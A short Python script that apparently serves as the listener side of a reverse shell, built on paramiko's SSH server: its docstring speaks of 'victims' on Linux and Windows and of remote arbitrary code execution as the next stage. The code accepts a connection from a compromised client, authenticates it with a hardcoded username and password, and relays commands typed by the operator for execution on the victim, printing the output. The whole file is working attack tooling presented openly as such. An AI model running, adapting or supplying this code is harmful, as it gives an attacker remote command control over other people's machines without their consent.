"""
ssh server for sending commands for execution in the client side and get the result output from the
execution in the client side. Which called reverse shell execution :).

Tested in linux victim & windows victim, Which profes that the python execution will work in any 
environment which python3.6+ installed & paramiko.

Next stage: remotely execute arbitrary code which enables the rcmd.
"""

import socket
import paramiko
import threading
import sys

# using the server host key from the paramiko demo files
host_key = paramiko.RSAKey(filename='rsa_new')


class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if username == 'armando' and password == 'root':
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED


server = '192.168.10.156'
ssh_port = 2345

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((server, ssh_port))
    sock.listen(100)
    print("[+] Listening for connection...")
    client, addr = sock.accept()
except Exception as e:
    print("[-] Listen failed: " + str(e))
    sys.exit(1)

print("[+] Got a connection!")

try:
    # noinspection PyTypeChecker
    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(host_key)
    server = Server()
    try:
        bhSession.start_server(server=server)
    except paramiko.SSHException:
        print("[-] SSH negotiation failed.")
    chan = bhSession.accept(20)
    print("[+] Authenticated!")
    print(chan.recv(1024))
    chan.send("Welcome to bh_ssh!")
    while True:
        try:
            command = input("Enter command: ").strip("\n")
            if command != "exit":
                chan.send(command)
                print(chan.recv(1024).decode(errors="ignore") + "\n")
            else:
                chan.send("exit")
                print("Exiting...")
                bhSession.close()
                raise Exception("exit")
        except KeyboardInterrupt:
            bhSession.close()
        except Exception as e:
            print("[-] Caught exception: " + str(e))
            bhSession.close()
finally:
    sys.exit(1)